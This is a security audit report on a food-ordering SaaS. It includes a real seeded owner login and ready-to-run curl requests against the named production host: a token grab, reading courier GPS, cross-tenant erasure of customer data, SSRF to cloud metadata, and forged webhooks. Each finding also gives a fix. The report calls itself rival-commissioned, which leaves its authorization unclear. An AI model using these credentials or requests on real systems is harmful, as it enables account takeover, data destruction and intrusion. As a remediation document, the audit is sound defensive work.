# D1 — AppSec / AuthZ Red-Team Report — dowiz

- **Date**: 2026-07-13
- **Engagement**: External black/grey-box pentest of dowiz (food-ordering SaaS), rival-commissioned.
- **Scope**: Legacy TS stack API + web. OWASP Top 10 focus: broken access control / IDOR, authN, injection, SSRF, secrets, business logic, webhooks/CORS/CSRF.
- **Targets**: Source `/root/dowiz` branch `feat/decentralized-pq-protocol`; live `https://dowiz.fly.dev` (prod) and `https://dowiz-staging.fly.dev` (staging), read-only / non-destructive probing only.

> **Source-of-truth note.** On this branch the legacy API has been moved to `attic/apps-api/src` (a verbatim retirement-move of the deployed `apps/api`). All `file:line` cites are against `attic/apps-api/src/**`. Findings were cross-checked against the live deployments. One divergence was observed: the live prod deploy has an extra `/api/admin/*` kill-switch (returns `503 admin_unavailable`) that is **not** present in the attic source — see Finding 8.

---

## 1. Bottom line — can a rival hack it?

**Yes — a rival can obtain an authenticated production owner session today, with zero effort, using publicly-documented credentials.** This is the worst case and it is **CONFIRMED live against prod**:

`POST https://dowiz.fly.dev/api/auth/local/login` with `test@dowiz.com` / `test123456` (a "test owner fixture" documented in the repo's own `CLAUDE.md`/memory) returns a **production-key-signed** (`kid:"2"`) owner JWT for a real location, and that token is **accepted** by protected owner endpoints (`GET /api/owner/couriers` → `HTTP 200`). This is not a code bug in the login path — the login path is correct — it is a **seeded weak-credential account shipped into the production database with an active owner membership**.

From that foothold the attacker chains to:
- **Cross-role staff-PII / live-GPS leak** (Finding 2) — reachable even by a *customer* token, no owner account needed.
- **Server-Side Request Forgery into the Fly private network / cloud metadata** (Finding 4), reachable by any owner token including the backdoor account.
- **Cross-tenant customer-PII erasure** (Finding 3) — irreversible destruction of another venue's customer data.

**Mitigating the blast radius:** the platform's deeper defenses are genuinely strong and blocked several attacks — price is server-authoritative (no price/coupon/negative-qty manipulation), all SQL is parameterized (no injection found), input schemas are `.strict()` (no mass assignment), JWTs are RS256-only with no algorithm-confusion, the dev-login bypass fails closed on prod, and most owner routes are correctly tenant-scoped with `FORCE` RLS as a backstop. The problems are concentrated in (a) a shipped weak credential, (b) a handful of routes missing a role gate or an ownership re-check, and (c) an SSRF filter with an IPv6 gap.

**Net verdict: HIGH RISK.** One CRITICAL (shipped credential = immediate authenticated foothold) plus three HIGH issues that are individually exploitable. Remediation is cheap and localized.

---

## 2. Findings

### F1 — CRITICAL · Seeded weak owner credential live in production (`test@dowiz.com` / `test123456`)
- **Severity**: **Critical — CONFIRMED (live, prod)**
- **Location**: Live `POST https://dowiz.fly.dev/api/auth/local/login`; login handler `attic/apps-api/src/routes/auth/local.ts:85-146` (Path 2, real argon2). Credential documented in `.claude/CLAUDE.md` / project memory ("Test owner fixture test@dowiz.com/test123456").
- **Exploit** (verified, non-destructive):
  ```bash
  # 1. Anonymous login with public/documented creds → real prod owner token
  curl -s -X POST https://dowiz.fly.dev/api/auth/local/login \
    -H 'content-type: application/json' \
    -d '{"email":"test@dowiz.com","password":"test123456"}'
  # → 200 {"access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjIifQ...."}
  #   header {"alg":"RS256","kid":"2"}  ← PRODUCTION signing key (not the dev kid)
  #   payload {"role":"owner","userId":"00bf019a-...","activeLocationId":"3625d9b3-...","exp":...}

  # 2. Token is accepted by protected owner endpoints
  curl -s -H "Authorization: Bearer <token>" https://dowiz.fly.dev/api/owner/couriers
  # → HTTP 200  (confirmed authenticated owner session)
  ```
- **Impact**: Full owner takeover of the associated production location: read/modify that venue's orders, menu, promotions, couriers, settlements, and customer contact PII (via the owner's own-order reveal path), plus it is the launch point for F2/F3/F4. Even if `3625d9b3-…` is a demo tenant, this proves the local-login path issues **production-key owner sessions for seeded accounts**, so any other seeded/weak owner account is equally exploitable, and the credential is public.
- **Fix**: Delete/disable all seeded `test@*`/demo owner accounts from the prod DB (or rotate to a strong, unpublished password and strip owner membership). Add a boot-guard or CI check that FAILs if any user with an active owner membership has a known-fixture email or a password hash matching a documented test password. Never ship seed/fixture credentials to prod.

---

### F2 — HIGH · `owner/couriers.ts` GET routes missing `requireRole` → customer/courier can read staff roster + live GPS
- **Severity**: **High — CONFIRMED (from code; live-exploitable by any customer of the venue)**
- **Location**: `attic/apps-api/src/routes/owner/couriers.ts:14-15` (hook stack), handlers `:18` (`GET /api/owner/locations/:locationId/couriers`) and `:143` (`GET .../couriers/live`). Registered `attic/apps-api/src/server.ts:612`.
- **Root cause**: The plugin registers only `verifyAuth` + `requireLocationAccess` — **no `requireRole(['owner'])`**. `requireLocationAccess` (`auth.ts:127-140`) admits a `customer` whenever `user.locationId === :locationId` and a `courier` whenever `user.activeLocationId === :locationId`. The handler then sets `app.current_tenant = :locationId` from the URL (`couriers.ts:26`) and selects the roster `WHERE cl.location_id = :locationId`, so RLS returns the location's rows regardless of the caller's role.
- **Exploit**: A diner who has a customer token for venue X (minted on any order at X, `locationId=X`):
  ```bash
  curl -H "Authorization: Bearer <customer_token_for_X>" \
       https://dowiz.fly.dev/api/owner/locations/<X>/couriers
  curl -H "Authorization: Bearer <customer_token_for_X>" \
       https://dowiz.fly.dev/api/owner/locations/<X>/couriers/live   # live GPS
  ```
- **Impact**: Any customer (or any courier) of a venue can enumerate that venue's entire delivery-staff roster (names, masked email/phone, ratings, delivery counts) and **track couriers' live GPS positions** in real time. Cross-role horizontal privilege escalation + staff-safety/PII exposure. RLS does **not** help here — the caller legitimately belongs to X; the missing control is the role gate.
- **Fix**: Add `fastify.addHook('preValidation', requireRole(['owner']))` to the plugin (mirror `owner/dashboard.ts:15-17`). Longer term, factor a single shared owner-route hook bundle so no owner handler can register without the role gate.

---

### F3 — HIGH · Cross-tenant customer PII erasure via unvalidated `customerId` in GDPR request
- **Severity**: **High — CONFIRMED (from code; erasure is live, not fails-closed — see RLS note)**
- **Location**: `attic/apps-api/src/routes/owner/gdpr.ts:48` (+ INSERT `:81-86`) → worker `attic/apps-api/src/workers/anonymizer-gdpr.ts:26-65` → `attic/apps-api/src/lib/anonymizer/index.ts:118-141`.
- **Root cause**: `POST /api/owner/locations/:locationId/gdpr-requests` accepts a client-supplied `customerId` and stores it verbatim (`gdpr.ts:48` `resolvedCustomerId = customerId || null`). The *phone* path is correctly scoped (`WHERE location_id=$1 AND phone=$2`, `:50-51`) but the **direct `customerId` path is never checked against the caller's location**. The `gdpr_erasure_requests` row is inserted with `location_id = caller's, customer_id = victim's`; the table's RLS WITH-CHECK only validates `location_id`, so the insert passes. The worker then calls `anonymizeCustomer(customerId)`, which locks/updates `customers WHERE id=$1` **with no `location_id` filter** (`index.ts:119` and `:134-141`) — `locationId` (`:131`) is used only for the audit row.
- **Why RLS does not save it (live, confirmed)**: The worker uses the operational pool with **no `withTenant`**, so `app.user_id` is unset and `app_current_user()` returns NULL (`core-identity.ts:70-72`: `NULLIF(current_setting('app.user_id',true),'')`). The `customers` table carries `anonymous_update`/`anonymous_select` policies `USING (app_current_user() IS NULL)` (`migrations/1780338981782_customer-anonymous-update.ts:6-11`). RLS policies are permissive/OR'd, so a NULL-context connection is **granted UPDATE/SELECT on every customer row cross-tenant** — this is exactly why the erasure worker functions at all, and it means the missing `location_id` filter is directly exploitable.
- **Exploit**:
  ```bash
  curl -X POST https://dowiz.fly.dev/api/owner/locations/<MY_LOC>/gdpr-requests \
    -H "Authorization: Bearer <owner_jwt>" -H 'content-type: application/json' \
    -d '{"customerId":"<a customers.id belonging to ANOTHER venue>"}'
  # → 201; the background worker irreversibly scrubs that foreign customer's phone+name.
  ```
- **Impact**: An owner (or the F1 backdoor account) irreversibly anonymizes (destroys phone/name/marketing consent of) **another tenant's** customers. Destructive, non-recoverable, GDPR-integrity violation. Not Critical only because the attacker must know a foreign `customers.id` (v4 UUID, non-enumerable).
- **Fix**: In `gdpr.ts` before insert, verify ownership: `SELECT 1 FROM customers WHERE id=$customerId AND location_id=$locationId` → 404 if absent. Defense-in-depth: add `AND location_id=$2` to the anonymizer's customer SELECT/UPDATE (`index.ts:119,134-141`), and tighten the `anonymous_update`/`anonymous_select` customer policies so an unscoped null-context connection cannot touch arbitrary rows.

---

### F4 — HIGH · SSRF via IPv4-mapped IPv6 literal in brand extractor (`POST /api/owner/brand/generate`)
- **Severity**: **High — CONFIRMED (from code; authenticated owner, reachable by the F1 backdoor)**
- **Location**: Guard `attic/apps-api/src/lib/brand-extractor.ts:150-169` (`isPrivateIp` / `assertPublicUrl`), reached from `attic/apps-api/src/routes/spa-proxy.ts:587-599` (`extractFromWebsite(body.website)`).
- **Root cause**: `isPrivateIp` handles IPv4 numerically but for IPv6 only string-matches `::1`, `fc*`, `fd*`, `fe80*`, `::` (`:156-157`). An IPv4-mapped IPv6 literal such as `::ffff:169.254.169.254` matches none of these → returns `false`. And because `net.isIP("::ffff:169.254.169.254") === 6`, `assertPublicUrl` (`:167`) skips DNS resolution and trusts the literal. `fetch("http://[::ffff:169.254.169.254]/")` then connects to the IPv4 metadata endpoint at the OS layer.
- **Exploit**:
  ```bash
  curl -X POST https://dowiz.fly.dev/api/owner/brand/generate \
    -H "Authorization: Bearer <owner_jwt>" -H 'content-type: application/json' \
    -d '{"website":"http://[::ffff:169.254.169.254]/latest/meta-data/"}'
  # also ::ffff:127.0.0.1, ::ffff:10.x, or an AAAA record → ::ffff:a9fe:a9fe
  ```
- **Impact**: Any authenticated owner reaches the cloud metadata service and Fly 6PN internal hosts. Semi-blind: the extractor reflects parsed `name`/colours/`sources` from the internal response. Combined with F1, an anonymous attacker reaches the internal network.
- **Fix**: In `isPrivateIp`, unwrap the mapped form before classifying — `if (v.startsWith('::ffff:')) return isPrivateIp(v.slice(7));` — and reject any `net.isIP()===6` value that embeds an IPv4 literal. Ideally pin the resolved IP into the connection (undici dispatcher) to also close the documented DNS-rebind TOCTOU (`brand-extractor.ts:182-184`).

---

### F5 — MEDIUM · Telegram webhook: secret-token header not enforced (+ full bypass when secret is empty)
- **Severity**: **Medium (High if `TELEGRAM_BOT_SECRET` is unset/empty) — CONFIRMED (from code)**
- **Location**: `attic/apps-api/src/routes/telegram-webhook.ts:36-61`; wiring `attic/apps-api/src/server.ts:640-646` (`telegramBotSecret: env.TELEGRAM_BOT_SECRET || ''`).
- **Root cause**: (a) When the `x-telegram-bot-api-secret-token` header is **absent**, the request is processed anyway (`:57-60`, "process anyway for backward compat") — leaving only the URL path segment as the gate. (b) When present, the comparison is a plain `!==` (`:50`), not constant-time. (c) If `TELEGRAM_BOT_SECRET` is empty, `if (telegramBotSecret)` is falsy, the whole check is skipped and the route mounts at the predictable path `/webhook/telegram/` with **zero authentication**.
- **Exploit** (path secret leaks readily via logs/proxy; or empty):
  ```bash
  curl -X POST "https://dowiz.fly.dev/webhook/telegram/<BOT_SECRET_OR_EMPTY>" \
    -H 'content-type: application/json' \
    -d '{"callback_query":{"id":"1","from":{"id":<OWNER_TG_ID>},"message":{"chat":{"id":<OWNER_TG_ID>},"message_id":1,"text":"x"},"data":"order.confirm:<ORDER_UUID>"}}'
  ```
- **Impact**: Forged Telegram updates drive order state (confirm/reject), shift open, storefront close, notification-pref changes — bypassing the intended header auth. See F11 for the identity-forgery amplifier.
- **Fix**: Require the header unconditionally, compare with `crypto.timingSafeEqual`, and FATAL boot-guard if `TELEGRAM_BOT_SECRET` is empty.

---

### F6 — MEDIUM · Customer token is order-scoped but customer endpoints authorize by `customer_id` only
- **Severity**: **Medium — CONFIRMED (from code)**
- **Location**: `attic/apps-api/src/routes/customer/orders.ts:28,46` (status), `:217` (rating), `:260-266` (cancel); `attic/apps-api/src/routes/order-messages.ts:61-62,132-133,163-164`. Contrast the correct check at `orders.ts:815` (`user.orderId !== id`).
- **Root cause**: The customer JWT is bound to a single `orderId` (issued per-order, `issueCustomerToken`, `jwt.ts:117-132`), but these handlers only enforce `WHERE o.id=$1 AND o.customer_id=$2` (`$2 = request.user.sub`) and never check the token's `orderId` claim.
- **Exploit**: A per-order tracking link (designed to expose exactly one order) is minted via `POST /api/customer/track/exchange`. With that token: `GET /api/customer/orders/<any-other-orderB>/status` (and `/cancel`, `/rating`) succeeds for **any** order whose `customer_id` equals the token's `sub` (i.e. every order from that phone at that venue).
- **Impact**: A single-order link grants read of address/items/tip/masked courier PII + live position, plus cancel/rate, across all that customer's orders. Blast radius capped by needing other order UUIDs (non-enumerable), but the per-order boundary is defeated and cancel is an integrity action.
- **Fix**: In each customer handler add `if (request.user.orderId !== request.params.orderId) return reply.status(404)…` alongside the existing `customer_id` check.

---

### F7 — MEDIUM · Settlement regeneration runs across ALL tenants
- **Severity**: **Medium — CONFIRMED (from code)**
- **Location**: `attic/apps-api/src/routes/owner/settlements.ts:301-314` (`POST /api/owner/locations/:locationId/settlements/regenerate`).
- **Root cause**: The handler calls `worker.handleGenerate(new Date(referenceDate))` with **no `locationId`**; the inline comment admits "Technically processes all locations."
- **Exploit**: `POST /api/owner/locations/<MY_LOC>/settlements/regenerate` as any owner → triggers payout regeneration for **every** tenant (rate-limited 5/5min, still global).
- **Impact**: Cross-tenant money-record side effects and compute-DoS from a single low-privilege owner.
- **Fix**: Thread the scope through — `handleGenerate(date, locationId)` with `WHERE location_id=$locationId` inside the worker.

---

### F8 — MEDIUM · `/api/admin/*` authorizes on `requireRole(['owner'])`, not a dedicated admin role, and is not tenant-scoped
- **Severity**: **Medium — CONFIRMED-in-code / currently mitigated in prod**
- **Location**: `attic/apps-api/src/routes/admin/backups.ts:8-9`, `admin/fallback.ts:9-10`, `admin/notification-audit.ts:8-9` (all gate on `requireRole(['owner'])`); `/api/admin/*` is **not** in the global `AUTH_PREFIXES` (`server.ts:510`), so only these per-route hooks apply.
- **Root cause**: Any authenticated *owner* (there is no distinct admin role) reaches platform-operations endpoints. `notification-audit.ts:22-40` makes `locationId` optional and aggregates `notification_outbox_audit` **across all tenants** when omitted, and echoes `detail: err.message` on 500 (`:47`). `backups/dr-report` (`backups.ts:78-81`) runs a platform-wide `runRestoreVerify(..., {fullHash:true})`.
- **Live status**: On the current prod deploy, `/api/admin/*` returns `503 {"error":"admin_unavailable"}` even with a valid owner token — an admin kill-switch present in the deployed build but **absent from the attic source**. So the cross-tenant leak is real in code but neutralized in prod today; it re-activates if the kill-switch is lifted.
- **Impact**: Cross-tenant notification metadata disclosure + platform-wide, resource-intensive backup verification triggerable by any owner; verbose DB-error leak.
- **Fix**: Introduce a real `admin` role (or an allow-list of admin user ids) and gate `/api/admin/*` on it; make `locationId` mandatory and scope every admin query to the caller; route admin errors through the generic error handler (drop `detail: err.message`).

---

### F9 — LOW/MEDIUM · `owner/couriers.ts` `PATCH /:courierId` has no Zod schema and no role gate (latent privilege manipulation)
- **Severity**: **Medium — PLAUSIBLE (currently saved by an incidental RLS error, not by design)**
- **Location**: `attic/apps-api/src/routes/owner/couriers.ts:75-140`.
- **Root cause**: Reads `body.status` / `body.role` with no schema/allowlist and (per F2) no `requireRole`. It sets no `app.current_tenant`, so the first `courier_locations` query hits that table's RLS on an unset GUC → errors → 500. Only that accident prevents a non-owner from setting arbitrary courier `status`/`role` and revoking a rival courier's sessions (`:110-116`).
- **Fix**: Add `requireRole(['owner'])`, a strict Zod body with `status`/`role` enums, and set the tenant context explicitly.

---

### F10 — LOW · Owner local login: user enumeration + timing oracle
- **Severity**: **Low — CONFIRMED (from code)**
- **Location**: `attic/apps-api/src/routes/auth/local.ts:90-108`.
- **Root cause**: Unknown email early-returns without running argon2 (`:90-92`) → measurable timing delta vs a known email; and a **distinct** message `'Account uses another sign-in method'` (`:95-97`) confirms an account exists for OAuth-only users. (The courier path deliberately runs a dummy verify to equalize timing; the owner path does not.) Rate-limited 5/min/IP (`:39`).
- **Impact**: Confirms which emails are registered owners → targeted credential-stuffing/phishing.
- **Fix**: Run a dummy `argon2.verify` on the no-user / no-hash branches and collapse `:96` into the generic `'Invalid email or password'`.

---

### F11 — LOW · Telegram webhook trusts caller-supplied `from.id` as identity; no `update_id` de-dup (replay)
- **Severity**: **Low — PLAUSIBLE (amplifier of F5; needs F5 + a known owner Telegram id)**
- **Location**: `attic/apps-api/src/routes/telegram-webhook.ts:123-125,156-248`.
- **Root cause**: The authorization chain keys off `callbackQuery.from.id` (attacker-controlled in a forged body); supplying the victim owner's numeric Telegram id satisfies the `owner_notification_targets` + membership checks. No `update_id` de-duplication → forged/captured updates are replayable. (The `/start login_<token>` account-linking flow is **not** affected — it uses unguessable UUID tokens, single-use `FOR UPDATE`, with expiry.)
- **Fix**: Collapses once F5 enforces a mandatory constant-time header; additionally persist and reject duplicate `update.update_id`.

---

### F12 — LOW · Missing CSP / Permissions-Policy; `X-Frame-Options` dropped on any URL containing `embed=true`
- **Severity**: **Low — CONFIRMED (live)**
- **Location**: `attic/apps-api/src/server.ts:171-181` (header hook). No `Content-Security-Policy` or `Permissions-Policy` set anywhere; `X-Frame-Options` is skipped whenever `request.url.includes('embed=true')` (`:177`) — a loose substring match.
- **Impact**: No CSP safety-net limiting the blast radius of any future XSS on the SPA; and appending `?x=embed=true` (or `?embed=true`) to a sensitive URL strips clickjacking protection for that response.
- **Fix**: Add a strict `Content-Security-Policy` (and `Permissions-Policy`) via a header hook / helmet; make the embed exception a parsed, allow-listed query flag on specifically-whitelisted widget routes, not a substring test.

---

### F13 — LOW · Defense-in-depth gaps that currently rely solely on RLS / a flag
- **Severity**: **Low — CONFIRMED as gaps / not independently exploitable today**
- Items:
  - **`owner/courier-invites.ts:20-31`** — no `requireRole(['owner'])` and `role`/`email` taken raw; saved only because `withTenant` + `app_member_location_ids()` = caller's memberships (customers/couriers have none → RLS denies). `couriers.ts:16,25-28` similarly treats a `SELECT 1 FROM locations` (which has `public_select USING(true)`) as an ownership check — an illusory gate. Add explicit `SELECT 1 FROM memberships WHERE user_id=$1 AND location_id=$2 AND role='owner' AND status='active'`.
  - **`owner/products.ts:210-216,238,255,281-288`** — sub-resources scope by `product_id` only; safe today only because `product_translations`/`product_modifier_groups` are `FORCE` RLS. Add an explicit `AND EXISTS (SELECT 1 FROM products WHERE id=$id AND location_id=$locationId)`.
  - **Google OAuth `id_token` signature not verified** (`auth.ts:106-107`, `decodeJwt` not `jwtVerify`) — acceptable under the authorization-code flow (server-to-server over TLS, `state`+PKCE+`nonce` checked, flag-gated off) but verify against Google JWKS before launch.
  - **Stale `activeLocationId` trusted from the access token** (`spa-proxy.ts:69,126`) up to 24h after an owner is removed (documented ADR-0004 accepted risk). Re-assert active membership on state-changing owner routes.
  - **OTP intent-binding gap + `JSON.parse` 500** (`customer/otp.ts:158-165,190`) — OTP is globally disabled today; if enabled, bind the verified session to the stored `order_intent_hash` and `safeParse` the hex.

---

## 3. Verified NOT vulnerable (checked — reported so they are not re-audited)

- **Price authority** — SAFE. Line/tax/total computed server-side from DB rows on one in-tx MVCC snapshot (`orders.ts:388-392,420-426,506,563-565`); `CreateOrderInput` forces `quantity` positive int ≤99, `cash_pay_with` positive int; `discountTotal` is hard-coded `0` (`:564`); `assertNonNegative(total)` (`:566`). No price/coupon/negative-qty/overflow path.
- **SQL injection** — SAFE. Every query across audited handlers is parameterized (`$1..$n`); the only interpolated identifier (`orderStatusService.ts` status column) comes from a fixed enum allow-list. No NoSQL/command injection; the one `execFileSync` uses an argv array with a fixed script and server temp path.
- **Mass assignment** — SAFE. `CreateOrderInput` and nested objects are `.strict()`; `locations.ts` UPDATE column list is a `.strict()` Zod allow-list (no `id`/`owner_id`/`role`).
- **Order-state tampering** — SAFE. `PATCH /orders/:id/status` is `verifyAuth`+`requireRole(['owner'])`+`withTenant` (`orders.ts:887-904`) with `assertTransition` + status-guarded `UPDATE … WHERE status=currentStatus`. No customer route mutates status.
- **OTP brute-force** — SAFE. 6-digit code, argon2id-hashed, per-attempt increment + hard lockout at 5, rate-limited (verify 5/15min, send 3/15min), code never logged.
- **Idempotency/replay (orders)** — SAFE. Tenant-scoped `(key, location_id)` bound to a canonical `request_hash`; reuse with a different body → 422.
- **JWT** — SAFE. RS256-only (`packages/platform/src/auth/jwt.ts:105-111`), `alg=none` rejected, dev-kid segregated with `NODE_ENV==='production'` short-circuit, Zod-validated claims. No algorithm-confusion. (Minor: no `iss`/`aud` claim check — hardening only.)
- **Dev-login / mock-auth bypass** — SAFE on prod. `devLoginAllowed` needs `ALLOW_DEV_LOGIN==='true'` AND `DEV_AUTH_SECRET`; the global `/dev/*` hook (`server.ts:515-526`) 404s all dev endpoints with a constant-time `x-dev-auth-secret` check; verified `POST /api/dev/mock-auth` → 404 on prod.
- **CORS** — SAFE. Default-deny origin callback (`server.ts:185-191`); `Access-Control-Allow-Origin:*` override only on `/s/*`, `/public/locations/*`, and `POST /api/orders`, all with `credentials:false` (bearer-token auth, no cookies) → no authenticated cross-origin read. Verified: no ACAO reflected for an evil origin on authenticated routes.
- **Redirect-based SSRF** — SAFE. `fetchText` uses `redirect:'manual'` and re-validates every hop (`brand-extractor.ts:187-194`). (Residual DNS-rebind TOCTOU acknowledged in-code — see F4 fix.)
- **Correctly-scoped owner routes** — `reveal-contact.ts` (order re-scoped `WHERE o.id=$1 AND o.location_id=$2`, audited, rate-limited), `promotions.ts`, `locations.ts`, `dashboard.ts`, `products.ts` primary + `menu/*`, `gdpr.ts` list/get/retention, and courier invite-accept (`courier/auth.ts:55-136`, argon2 64-bit code, location bound from the invite row) — all verified clean.
- **Error handling** — global handler strips stack traces / internals with a correlationId (`server.ts:539-568`). (Exceptions: `notification-audit` verbose `detail` in F8; parser-message echo on malformed JSON, negligible.)

---

## 4. Auth model summary

- **Tokens**: RS256 JWT (`jose`), kid-selected verification key, prod-kid vs segregated dev-kid; issued for `owner` (24h, + 7d rotating refresh family, sha256-hashed, single-use with family-revoke-on-reuse), `courier` (session-bound, revocable server-side), and `customer` (7d, bound to a single `orderId`, no PII in claims).
- **Two-layer gate**:
  1. **Global onRequest** (`server.ts:515-537`): 404s `/dev/*` unless dev-authorized; requires a Bearer token to be *present* (not validated) for `AUTH_PREFIXES = /api/owner/`, `/api/courier/`, `/api/customer/`; carve-outs for `courier/auth`, `customer/track/exchange`, public OTP send/verify.
  2. **Per-route preHandlers**: `verifyAuth` (validates JWT, binds courier tokens to a live session/membership) → `requireRole([...])` (role allow-list) → `requireLocationAccess` (owner: active-membership check on the URL `:locationId`; customer/courier: JWT-claim match). **This chain is only as good as each route wiring it — the F2/F9/F13 routes omit `requireRole`.**
- **Tenant isolation**: `FORCE ROW LEVEL SECURITY` on core tables. Two tenant-context variables coexist — `app.user_id` (set by `withTenant`, drives `app_member_location_ids()` for owner/customer tables) and `app.current_tenant` (set manually from the JWT `activeLocationId` for courier/settlement tables). The inconsistency is a systemic root cause: some routes leak (F2), some are saved only by accidental RLS errors (F9), and a null-context worker gets broad cross-tenant grants (F3).
- **Authoritative server-side**: prices, totals, tax, order-state transitions, idempotency — all computed/enforced server-side. Client input is Zod-`.strict()`-validated at every boundary.

---

## 5. Quick-win hardening list (priority order)

1. **[CRITICAL] Purge seeded/demo owner credentials from prod** (`test@dowiz.com` et al.); add a CI/boot guard that fails on any active-owner user with a fixture email or documented test-password hash. (F1)
2. **[HIGH] Add `requireRole(['owner'])` to `owner/couriers.ts`** (and audit every `/api/owner/*` plugin for the same omission — `courier-invites.ts`, the `couriers.ts` PATCH). (F2, F9, F13)
3. **[HIGH] Validate `customerId` against the caller's location in `gdpr.ts`** and add `AND location_id=$2` to the anonymizer SELECT/UPDATE; tighten the `customers` `anonymous_update`/`anonymous_select` policies. (F3)
4. **[HIGH] Fix the SSRF IPv6 gap** — unwrap `::ffff:` mapped addresses in `isPrivateIp`; pin resolved IP into the fetch dispatcher. (F4)
5. **[MED] Enforce the Telegram webhook secret header** unconditionally with `timingSafeEqual`; FATAL boot-guard on empty `TELEGRAM_BOT_SECRET`; de-dup `update_id`. (F5, F11)
6. **[MED] Enforce the customer token's `orderId` claim** in all `customer/orders.*` and `order-messages.*` handlers. (F6)
7. **[MED] Scope settlement regeneration to `locationId`.** (F7)
8. **[MED] Introduce a real `admin` role** for `/api/admin/*`, make `locationId` mandatory, drop verbose `detail` errors; keep the prod kill-switch until then. (F8)
9. **[LOW] Equalize login timing + generic error message** (F10); add strict `Content-Security-Policy`/`Permissions-Policy` and fix the `embed=true` substring frame-bypass (F12); verify Google `id_token` against JWKS before OAuth launch; re-assert owner membership instead of trusting stale `activeLocationId` (F13).
10. **[STRUCTURAL] One shared owner-route hook bundle + one tenant-context helper**, so no handler can register without both the role gate and a consistent RLS context — this closes the F2/F9/F13 class at the root.

---

*Methodology: OWASP ASVS / Top 10, manual source review of `attic/apps-api/src/**` route handlers + auth middleware + RLS migrations, cross-checked with non-destructive live probing of prod/staging. All `CONFIRMED` findings are backed by either a proven code path or an observed live response; `PLAUSIBLE` findings state their precondition.*
